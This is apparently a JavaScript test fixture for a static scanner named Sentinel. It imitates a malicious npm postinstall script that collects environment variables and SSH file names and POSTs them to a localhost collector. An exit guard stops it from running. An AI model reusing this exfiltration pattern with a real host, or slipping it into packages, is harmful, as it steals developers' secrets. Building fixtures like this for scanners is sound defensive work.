// FAKE TEST FIXTURE for Sentinel. NEVER RUN THIS FILE.
// It imitates a credential-stealing postinstall script so the static scanner
// has something to find. The guard below stops it immediately if it is ever
// executed by mistake, and the "collector" is a fake localhost URL.
'use strict';

console.error('FAKE TEST FIXTURE: refusing to run. See fixtures/evil-postinstall/README.md.');
process.exit(1);

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const env = JSON.stringify(process.env);

let sshFiles = [];
try {
  sshFiles = fs.readdirSync(path.join(os.homedir(), '.ssh'));
} catch (err) {
  sshFiles = [];
}

const req = https.request('http://localhost:9999/collect', { method: 'POST' });
req.write(JSON.stringify({ env, sshFiles }));
req.end();
